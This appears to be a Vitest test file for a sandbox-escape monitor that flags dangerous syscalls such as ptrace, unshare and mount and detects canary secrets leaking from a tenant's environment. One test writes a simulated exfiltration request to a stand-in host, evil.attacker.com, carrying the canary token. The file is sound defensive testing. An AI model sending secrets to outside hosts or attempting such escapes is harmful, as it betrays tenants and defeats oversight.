import { describe, it, expect } from "vitest";
import fs from "node:fs";
import path from "node:path";
import {
  SandboxEscapeMonitor,
  type SyscallAnomalyEvent,
} from "../../packages/common/src/sandbox-monitor.js";

describe("Sandbox Escape Monitoring & Canary Leakage Detection", () => {
  const fixturesPath = path.resolve(
    __dirname,
    "../sandbox_fixtures/anomaly_events.json",
  );

  it("detects escape-attempt fixtures and generates critical alert paging on-call", () => {
    expect(fs.existsSync(fixturesPath)).toBe(true);
    const rawEvents: SyscallAnomalyEvent[] = JSON.parse(
      fs.readFileSync(fixturesPath, "utf8"),
    );

    const monitor = new SandboxEscapeMonitor();
    const result = monitor.evaluateSyscalls(rawEvents);

    expect(result.hasAlert).toBe(true);
    expect(result.violations.length).toBe(4);
    expect(result.alert).toBeDefined();

    const dispatched = monitor.getDispatchedAlerts();
    expect(dispatched.length).toBe(1);
    expect(dispatched[0].type).toBe("sandbox_escape_attempt");
    expect(dispatched[0].severity).toBe("critical");
    expect(dispatched[0].pagedOnCall).toBe(true);
    expect(dispatched[0].details.syscalls).toContain("ptrace");
    expect(dispatched[0].details.syscalls).toContain("unshare");
    expect(dispatched[0].details.syscalls).toContain("mount");
  });

  it("does not alert on benign normal syscall events", () => {
    const normalEvents: SyscallAnomalyEvent[] = [
      {
        pid: 100,
        syscall: "read",
        executable: "/usr/bin/node",
        blocked: false,
        timestamp: new Date().toISOString(),
        anomalyType: "unauthorized_syscall", // benign syscall name
      },
    ];

    const monitor = new SandboxEscapeMonitor();
    // Overwrite benign syscall to not be in dangerous set
    normalEvents[0].anomalyType = undefined as any;
    const result = monitor.evaluateSyscalls(normalEvents);

    expect(result.hasAlert).toBe(false);
    expect(result.violations).toHaveLength(0);
    expect(monitor.getDispatchedAlerts()).toHaveLength(0);
  });

  it("generates canary secrets and pages on simulated leakage probe", () => {
    const monitor = new SandboxEscapeMonitor();
    const tenantId = "tenant-fintech-9";

    const canaryToken = monitor.generateCanarySecret(tenantId);
    expect(canaryToken).toMatch(new RegExp(`^airp_canary_${tenantId}_[a-f0-9]{32}$`));

    // Negative check: clean payload has no leakage
    const cleanPayload = "Standard worker process output: test suite passed with 0 errors.";
    const cleanResult = monitor.detectCanaryLeakage(cleanPayload, tenantId);
    expect(cleanResult.leaked).toBe(false);

    // Simulated leakage probe: canary token leaked into egress / logs
    const leakedLog = `POST /telemetry HTTP/1.1\nHost: evil.attacker.com\nAuthorization: Bearer ${canaryToken}`;
    const leakResult = monitor.detectCanaryLeakage(leakedLog, tenantId);

    expect(leakResult.leaked).toBe(true);
    expect(leakResult.matchedToken).toBe(canaryToken);
    expect(leakResult.alert).toBeDefined();
    expect(leakResult.alert?.severity).toBe("critical");
    expect(leakResult.alert?.pagedOnCall).toBe(true);
    expect(leakResult.alert?.summary).toContain(`tenant '${tenantId}'`);

    const dispatched = monitor.getDispatchedAlerts();
    expect(dispatched.some((a) => a.type === "canary_token_leakage")).toBe(true);
  });
});
